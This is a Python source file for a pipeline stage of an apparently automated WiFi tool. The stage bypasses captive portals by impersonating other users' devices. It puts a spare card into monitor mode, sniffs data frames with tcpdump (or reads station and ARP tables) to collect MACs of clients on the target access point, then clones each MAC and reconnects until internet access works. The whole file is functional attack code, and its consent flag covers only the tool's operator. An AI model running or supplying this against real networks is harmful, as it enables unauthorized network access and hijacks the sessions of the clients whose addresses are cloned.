"""MAC Clone Stage — bypass captive portals by cloning an authenticated client's MAC.

When a captive portal blocks internet access and auto-authentication fails,
this stage sniffs for clients that ARE authenticated (have bypassed the portal)
and clones their MAC address to gain the same access.

REQUIRES EXPLICIT USER CONSENT — this stage modifies the network interface's
hardware address and impersonates another device.
"""

import re
import subprocess
import time

from logging_config import get_logger
from vasili import PipelineStage, StageResult, WifiNetwork
import network_isolation

logger = get_logger(__name__)


class MacCloneStage(PipelineStage):
    """Clone an authenticated client's MAC to bypass captive portals."""
    name = 'mac_clone'
    requires_consent = True

    def can_run(self, network: WifiNetwork, card, context: dict) -> bool:
        """Only run if captive portal was detected and auth failed."""
        return (
            context.get('captive_portal_detected', False)
            and not context.get('has_internet', False)
        )

    def run(self, network: WifiNetwork, card, context: dict) -> StageResult:
        cfg = self.get_module_config()
        max_attempts = cfg.get('max_clone_attempts', 3)
        restore_on_failure = cfg.get('restore_on_failure', True)

        original_mac = self._get_current_mac(card.interface)
        if not original_mac:
            return StageResult(
                success=False, has_internet=False,
                context_updates={'mac_cloned': False},
                message='Could not read current MAC address',
            )

        # Find candidate MACs — clients associated with the same AP.
        # Prefer real associated clients sniffed in monitor mode (needs a
        # spare card); fall back to ARP/station discovery on the live link.
        candidates = self._discover_candidates(network, card, context)
        if not candidates:
            logger.info('No candidate MACs found for cloning')
            return StageResult(
                success=False, has_internet=False,
                context_updates={'mac_cloned': False},
                message='No authenticated clients found to clone',
            )

        logger.info(f'Found {len(candidates)} candidate MACs to try')

        for i, candidate_mac in enumerate(candidates[:max_attempts]):
            logger.info(
                f'MAC clone attempt {i+1}/{min(len(candidates), max_attempts)}: '
                f'{candidate_mac}'
            )

            # Tear down routing before MAC change
            if card._routing_info:
                network_isolation.teardown_interface_routing(
                    card.interface, card._routing_info
                )
                card._routing_info = None

            # Change MAC
            if not self._set_mac(card.interface, candidate_mac):
                logger.warning(f'Failed to set MAC to {candidate_mac}')
                continue

            # Re-connect to the network
            if not card.connect(network):
                logger.warning('Failed to reconnect after MAC change')
                continue

            # Wait for connection + DHCP, then poll for connectivity within
            # a bounded retry window (captive portals can be slow to release).
            if self._wait_for_connectivity(card.interface, cfg):
                logger.info(f'MAC clone successful: {candidate_mac}')
                return StageResult(
                    success=True, has_internet=True,
                    context_updates={
                        'mac_cloned': True,
                        'original_mac': original_mac,
                        'cloned_mac': candidate_mac,
                        'has_internet': True,
                    },
                    message=f'Cloned MAC {candidate_mac} — internet accessible',
                )

        # All attempts failed — restore original MAC if configured to.
        if restore_on_failure:
            logger.info('All MAC clone attempts failed, restoring original')
            self._set_mac(card.interface, original_mac)
            card.connect(network)

        return StageResult(
            success=False, has_internet=False,
            context_updates={
                'mac_cloned': False,
                'original_mac': original_mac,
            },
            message=f'Tried {min(len(candidates), max_attempts)} MACs, none worked',
        )

    @staticmethod
    def _wait_for_connectivity(interface: str, cfg: dict) -> bool:
        """Wait for DHCP then poll for real connectivity within a window.

        Replaces the old flat ``sleep(2)``: gives DHCP a grace period and
        then retries the connectivity check, since a freshly-cloned MAC can
        take a few seconds for the portal/gateway to honour.
        """
        dhcp_wait = cfg.get('dhcp_wait', 5)
        retries = cfg.get('connectivity_retries', 5)
        timeout = cfg.get('connectivity_timeout', 3)

        if dhcp_wait > 0:
            time.sleep(dhcp_wait)

        for attempt in range(max(1, retries)):
            if network_isolation.verify_connectivity(interface):
                return True
            if attempt < retries - 1:
                time.sleep(timeout)
        return False

    @staticmethod
    def _get_current_mac(interface: str) -> str | None:
        """Read the current MAC address of an interface."""
        try:
            result = subprocess.run(
                ['ip', 'link', 'show', interface],
                capture_output=True, text=True, timeout=5,
            )
            # Parse "link/ether AA:BB:CC:DD:EE:FF"
            match = re.search(r'link/ether\s+([0-9a-f:]{17})', result.stdout, re.I)
            if match:
                return match.group(1)
        except Exception as e:
            logger.error(f'Failed to get MAC for {interface}: {e}')
        return None

    @staticmethod
    def _set_mac(interface: str, mac: str) -> bool:
        """Set the MAC address of an interface (requires interface to be down)."""
        try:
            subprocess.run(
                ['ip', 'link', 'set', interface, 'down'],
                check=True, capture_output=True, timeout=5,
            )
            subprocess.run(
                ['ip', 'link', 'set', 'dev', interface, 'address', mac],
                check=True, capture_output=True, timeout=5,
            )
            subprocess.run(
                ['ip', 'link', 'set', interface, 'up'],
                check=True, capture_output=True, timeout=5,
            )
            logger.debug(f'Set {interface} MAC to {mac}')
            return True
        except subprocess.CalledProcessError as e:
            logger.error(f'Failed to set MAC on {interface}: {e}')
            return False

    def _discover_candidates(self, network: WifiNetwork, card,
                             context: dict) -> list[str]:
        """Build an ordered, de-duplicated candidate MAC list.

        Monitor-mode-sniffed clients (real associated stations) are preferred
        and ordered first; the on-link ARP/station fallback fills the rest.
        """
        monitor_macs = self._monitor_discover_clients(network, context)
        fallback_macs = self._find_candidate_macs(card.interface, network.bssid)

        seen = set()
        ordered = []
        for mac in [*monitor_macs, *fallback_macs]:
            if mac and mac not in seen:
                seen.add(mac)
                ordered.append(mac)
        return ordered

    def _monitor_discover_clients(self, network: WifiNetwork,
                                  context: dict) -> list[str]:
        """Lease a spare card, sniff in monitor mode for stations talking to
        the target BSSID, and return their MACs.

        Returns an empty list (safe fallback) if no spare card is available,
        tcpdump is missing, or monitor mode cannot be set. ALWAYS restores
        managed mode and returns the leased card (see commit 1d449d1).
        """
        card_mgr = context.get('card_manager')
        if card_mgr is None:
            return []

        mon = card_mgr.lease_card(holder='mac_clone')
        if mon is None:
            logger.info('No spare card for monitor-mode client discovery')
            return []

        cfg = self.get_module_config()
        monitor_seconds = cfg.get('monitor_seconds', 15)
        clients: list[str] = []
        try:
            # Detach from NetworkManager so it doesn't fight monitor mode.
            try:
                subprocess.run(
                    ['nmcli', 'device', 'set', mon.interface, 'managed', 'no'],
                    capture_output=True, timeout=5,
                )
            except Exception:
                pass

            if not mon.set_mode('monitor'):
                logger.warning(
                    f'Cannot set {mon.interface} to monitor mode for MAC clone'
                )
                return []

            self._set_channel(mon.interface, network.channel)
            clients = self._tcpdump_clients(
                mon.interface, network.bssid, monitor_seconds,
            )
            if clients:
                logger.info(
                    f'Monitor sniff found {len(clients)} associated clients '
                    f'for {network.bssid}'
                )
        except Exception as e:
            logger.error(f'Monitor-mode client discovery error: {e}')
        finally:
            try:
                mon.set_mode('managed')
            except Exception:
                pass
            try:
                subprocess.run(
                    ['nmcli', 'device', 'set', mon.interface, 'managed', 'yes'],
                    capture_output=True, timeout=5,
                )
            except Exception:
                pass
            card_mgr.return_card(mon, holder='mac_clone')

        return clients

    @staticmethod
    def _set_channel(interface: str, channel: int):
        """Set a monitor-mode interface to a specific channel."""
        try:
            subprocess.run(
                ['iw', 'dev', interface, 'set', 'channel', str(channel)],
                capture_output=True, timeout=5, check=True,
            )
            logger.debug(f'Set {interface} to channel {channel}')
        except Exception as e:
            logger.warning(f'Failed to set channel {channel} on {interface}: {e}')

    @staticmethod
    def _tcpdump_clients(interface: str, target_bssid: str,
                         capture_seconds: int) -> list[str]:
        """Sniff data frames in monitor mode and return MACs of stations
        associated with ``target_bssid``.

        Parses tcpdump ``-e`` link-layer output, collecting the non-BSSID
        address from frames where the BSSID appears (i.e. the station talking
        to this AP). Excludes the BSSID itself and broadcast/multicast.
        """
        target = target_bssid.lower()
        bpf_filter = 'type data'
        seen = set()
        clients: list[str] = []

        logger.info(
            f'tcpdump monitor sniff on {interface} for {capture_seconds}s '
            f'targeting {target_bssid}'
        )

        proc = None
        try:
            proc = subprocess.Popen(
                [
                    'tcpdump', '-i', interface,
                    '-e',  # link-layer header (includes MACs)
                    '-l',  # line-buffered
                    '-c', '500',
                    bpf_filter,
                ],
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                text=True,
            )

            deadline = time.time() + capture_seconds
            while time.time() < deadline:
                try:
                    import select
                    ready, _, _ = select.select([proc.stdout], [], [], 1.0)
                    if not ready:
                        if proc.poll() is not None:
                            break
                        continue
                    line = proc.stdout.readline()
                    if not line:
                        break
                    low = line.lower()
                    if target not in low:
                        continue
                    # All MACs on the line; the station is the one != BSSID.
                    macs = re.findall(r'\b([0-9a-f]{2}(?::[0-9a-f]{2}){5})\b', low)
                    for mac in macs:
                        if mac == target:
                            continue
                        # Exclude broadcast/multicast (LSB of first octet set).
                        first_octet = int(mac[:2], 16)
                        if first_octet & 0x01:
                            continue
                        if mac not in seen:
                            seen.add(mac)
                            clients.append(mac)
                except Exception:
                    break

            proc.terminate()
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()

        except FileNotFoundError:
            logger.warning('tcpdump not installed — skipping monitor sniff')
        except Exception as e:
            logger.error(f'tcpdump monitor sniff error: {e}')
        finally:
            if proc and proc.poll() is None:
                try:
                    proc.kill()
                except Exception:
                    pass

        return clients

    @staticmethod
    def _find_candidate_macs(interface: str, target_bssid: str) -> list[str]:
        """Find MAC addresses of clients associated with the target AP.

        Uses `iw dev <iface> scan dump` to find stations associated with
        the target BSSID. These are clients that have passed through the
        captive portal and may have internet access.
        """
        candidates = []

        try:
            # Method 1: Parse nmcli/iw for associated stations
            # iw dev <iface> station dump shows clients if we're connected
            result = subprocess.run(
                ['iw', 'dev', interface, 'station', 'dump'],
                capture_output=True, text=True, timeout=10,
            )

            # Parse station MAC addresses
            for line in result.stdout.split('\n'):
                match = re.match(r'Station\s+([0-9a-f:]{17})', line, re.I)
                if match:
                    mac = match.group(1).lower()
                    # Don't clone the AP's own MAC
                    if mac.lower() != target_bssid.lower():
                        candidates.append(mac)

        except Exception as e:
            logger.debug(f'iw station dump failed: {e}')

        if not candidates:
            # Method 2: Look at ARP table for other clients on same subnet
            try:
                result = subprocess.run(
                    ['ip', 'neigh', 'show', 'dev', interface],
                    capture_output=True, text=True, timeout=5,
                )
                for line in result.stdout.strip().split('\n'):
                    if not line:
                        continue
                    # Format: "IP lladdr MAC state"
                    match = re.search(r'lladdr\s+([0-9a-f:]{17})', line, re.I)
                    if match:
                        mac = match.group(1).lower()
                        if mac != target_bssid.lower():
                            candidates.append(mac)
            except Exception as e:
                logger.debug(f'ARP table scan failed: {e}')

        # Deduplicate
        seen = set()
        unique = []
        for mac in candidates:
            if mac not in seen:
                seen.add(mac)
                unique.append(mac)

        return unique

    def get_config_schema(self):
        return {
            'max_clone_attempts': {
                'type': 'int',
                'default': 3,
                'description': 'Maximum number of MAC addresses to try',
            },
            'restore_on_failure': {
                'type': 'bool',
                'default': True,
                'description': 'Restore original MAC if all clone attempts fail',
            },
            'monitor_seconds': {
                'type': 'int',
                'default': 15,
                'description': 'Seconds to sniff in monitor mode for real '
                               'associated clients (needs a spare card)',
            },
            'dhcp_wait': {
                'type': 'int',
                'default': 5,
                'description': 'Seconds to wait for DHCP after a MAC change '
                               'before testing connectivity',
            },
            'connectivity_retries': {
                'type': 'int',
                'default': 5,
                'description': 'Number of connectivity checks per cloned MAC',
            },
            'connectivity_timeout': {
                'type': 'int',
                'default': 3,
                'description': 'Seconds between connectivity retries',
            },
        }
